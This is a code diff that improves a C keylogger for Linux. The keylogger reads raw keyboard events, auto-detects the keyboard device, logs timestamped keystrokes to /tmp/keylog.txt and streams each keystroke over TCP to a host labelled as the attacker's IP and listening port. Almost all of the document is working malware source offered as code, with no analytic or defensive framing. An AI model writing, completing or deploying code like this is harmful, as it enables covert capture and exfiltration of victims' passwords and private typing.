@@ -5,78 +5,108 @@
 #include <arpa/inet.h>
 #include <string.h>
 #include <time.h>
+#include <dirent.h>
+#include <stdlib.h>
+#include <errno.h>
 
-const char *keys[] = {
-    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace", "Tab",
-    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "Enter", "Ctrl",
-    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "Shift",
-    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "Shift", "*", "Alt", "Space",
-    "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
-    "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left", "Center", "Right", "+",
-    "End", "Down", "PageDown", "Insert", "Delete", "", "", "", "F11", "F12", 
-    // Extend for arrows and special keys
-    [103] = "ArrowUp",
-    [105] = "ArrowLeft",
-    [106] = "ArrowRight",
-    [108] = "ArrowDown"
-};
+const char *keys[KEY_MAX + 1] = { NULL };
+
+void init_keys() {
+    // Minimal keymap + arrows
+    keys[1] = "ESC"; keys[2] = "1"; keys[3] = "2"; keys[4] = "3"; keys[5] = "4"; 
+    keys[6] = "5"; keys[7] = "6"; keys[8] = "7"; keys[9] = "8"; keys[10] = "9"; 
+    keys[11] = "0"; keys[12] = "-"; keys[13] = "="; keys[14] = "Backspace"; keys[15] = "Tab";
+    keys[16] = "q"; keys[17] = "w"; keys[18] = "e"; keys[19] = "r"; keys[20] = "t"; 
+    keys[21] = "y"; keys[22] = "u"; keys[23] = "i"; keys[24] = "o"; keys[25] = "p"; 
+    keys[26] = "["; keys[27] = "]"; keys[28] = "Enter"; keys[29] = "Ctrl";
+    keys[30] = "a"; keys[31] = "s"; keys[32] = "d"; keys[33] = "f"; keys[34] = "g"; 
+    keys[35] = "h"; keys[36] = "j"; keys[37] = "k"; keys[38] = "l"; keys[39] = ";"; 
+    keys[40] = "'"; keys[41] = "`"; keys[42] = "Shift"; keys[43] = "\\"; keys[44] = "z";
+    keys[45] = "x"; keys[46] = "c"; keys[47] = "v"; keys[48] = "b"; keys[49] = "n"; 
+    keys[50] = "m"; keys[51] = ","; keys[52] = "."; keys[53] = "/"; keys[54] = "Shift";
+    keys[57] = "Space"; keys[58] = "CapsLock";
+    keys[59] = "F1"; keys[60] = "F2"; keys[61] = "F3"; keys[62] = "F4"; keys[63] = "F5";
+    keys[64] = "F6"; keys[65] = "F7"; keys[66] = "F8"; keys[67] = "F9"; keys[68] = "F10";
+    keys[87] = "F11"; keys[88] = "F12";
+    keys[103] = "ArrowUp"; keys[105] = "ArrowLeft"; 
+    keys[106] = "ArrowRight"; keys[108] = "ArrowDown";
+}
+
+// Auto-detect the first keyboard device
+int detect_keyboard_device(char *device_path) {
+    FILE *fp = fopen("/proc/bus/input/devices", "r");
+    if (!fp) return -1;
+
+    char line[256], event[32];
+    int found = 0;
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, "keyboard")) { // likely keyboard device
+            while (fgets(line, sizeof(line), fp)) {
+                if (strstr(line, "Handlers=")) {
+                    char *ev = strstr(line, "event");
+                    if (ev) {
+                        sscanf(ev, "event%31s", event);
+                        snprintf(device_path, 64, "/dev/input/event%s", event);
+                        found = 1;
+                        break;
+                    }
+                }
+            }
+            break;
+        }
+    }
+    fclose(fp);
+    return found ? 0 : -1;
+}
 
 int main() {
-    // 1. Open keyboard device (replace event3 with your keyboard device)
-    int fd = open("/dev/input/event3", O_RDONLY);
-    if (fd == -1) {
-        perror("Cannot open input device");
+    init_keys();
+
+    char device[64];
+    if (detect_keyboard_device(device) != 0) {
+        fprintf(stderr, "Failed to auto-detect keyboard device.\n");
         return 1;
     }
 
-    // 2. Open log file
+    int fd = open(device, O_RDONLY);
+    if (fd == -1) { perror("Cannot open input device"); return 1; }
+
     FILE *log = fopen("/tmp/keylog.txt", "a");
-    if (!log) {
-        perror("Cannot open log file");
-        return 1;
-    }
+    if (!log) { perror("Cannot open log file"); return 1; }
 
-    // 3. Create TCP socket to Kali
+    // Setup TCP connection to Kali
     int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        sock = -1;
-    } else {
+    if (sock < 0) { perror("Socket creation failed"); sock = -1; }
+    else {
         struct sockaddr_in server;
         server.sin_family = AF_INET;
-        server.sin_port = htons(5555);                // Kali listening port
-        server.sin_addr.s_addr = inet_addr("192.168.48.128"); // Replace with Kali IP
-
+        server.sin_port = htons(5555);                // Attacker's listening port
+        server.sin_addr.s_addr = inet_addr("ATTACKER_IP_ADDRESS"); // Attacker's IP
         if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
             perror("Connect failed");
-            sock = -1; // fall back to local logging
+            sock = -1;
         }
     }
 
     struct input_event ev;
     while (1) {
-        read(fd, &ev, sizeof(ev));
-        if (ev.type == EV_KEY && ev.value == 1) { // key press
-            if (ev.code < sizeof(keys)/sizeof(keys[0])) {
-                // 4. Get timestamp
-                time_t now = time(NULL);
-                struct tm *t = localtime(&now);
-                char timestamp[32];
-                strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", t);
+        if (read(fd, &ev, sizeof(ev)) < (ssize_t)sizeof(ev)) continue;
 
-                // 5. Prepare log entry
-                char buffer[128];
+        if (ev.type == EV_KEY && ev.value == 1) {
+            char timestamp[32], buffer[128];
+            time_t now = time(NULL);
+            strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", localtime(&now));
+
+            if (ev.code <= KEY_MAX && keys[ev.code]) {
                 snprintf(buffer, sizeof(buffer), "%s %s\n", timestamp, keys[ev.code]);
-
-                // 6. Log locally
-                fprintf(log, "%s", buffer);
-                fflush(log);
-
-                // 7. Send to Kali if connected
-                if (sock != -1) {
-                    send(sock, buffer, strlen(buffer), 0);
-                }
+            } else {
+                snprintf(buffer, sizeof(buffer), "%s [KEY:%d]\n", timestamp, ev.code);
             }
+
+            fprintf(log, "%s", buffer);
+            fflush(log);
+
+            if (sock != -1) send(sock, buffer, strlen(buffer), 0);
         }
     }
 
